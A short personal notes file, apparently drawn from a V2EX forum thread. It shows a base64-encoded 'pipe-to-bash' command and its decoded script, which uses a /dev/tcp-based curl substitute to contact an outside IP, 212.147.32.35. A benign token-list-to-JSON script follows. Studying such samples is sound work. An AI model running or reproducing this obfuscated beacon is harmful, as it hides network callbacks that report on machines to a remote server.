

# /dev/tcp 实现 curl



```

// https://www.v2ex.com/t/811424#reply39

命令行: sh -c echo IyEvYmluL2Jhc2gKZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8JChlY2hvICR7MS8vLy8gfSkKICBET0M9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqfQogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCgogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJHRVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmUgJiYgY2F0KSA8JjMKICBleGVjIDM+Ji0KfQoKaWYgWyAteCAiJChjb21tYW5kIC12IGN1cmwpIiBdOyB0aGVuCiAgY3VybCAtbyAvZGV2L251bGwgMjEyLjE0Ny4zMi4zNS9nY2FlLzEwMS4zNy43OC4xMDgKZWxpZiBbIC14ICIkKGNvbW1hbmQgLXYgd2dldCkiIF07IHRoZW4KICB3Z2V0IC1xIC1PLSAyMTIuMTQ3LjMyLjM1L2djYWUvMTAxLjM3Ljc4LjEwOAplbHNlCiAgX19jdXJsIGh0dHA6Ly8yMTIuMTQ3LjMyLjM1L2djYWUvMTAxLjM3Ljc4LjEwOCA+L2Rldi9udWxsCmZpCgo= | base64 -d | bash


#!/bin/bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

if [ -x "$(command -v curl)" ]; then
  curl -o /dev/null 212.147.32.35/gcae/101.37.78.108
elif [ -x "$(command -v wget)" ]; then
  wget -q -O- 212.147.32.35/gcae/101.37.78.108
else
  __curl http://212.147.32.35/gcae/101.37.78.108 >/dev/null
fi
```



# access tokens

```
Converting from a newline delimited list of access tokens to `access_tokens.json`
​```bash
#!/bin/bash     

START="["
END="]"

TOKENS=""

while read -r line; do
  if [ -z "$TOKENS" ]; then
    TOKENS="\"$line\""
  else
    TOKENS+=",\"$line\""
  fi
done < access_tokens.txt

echo "$START$TOKENS$END" > access_tokens.json
​```
```

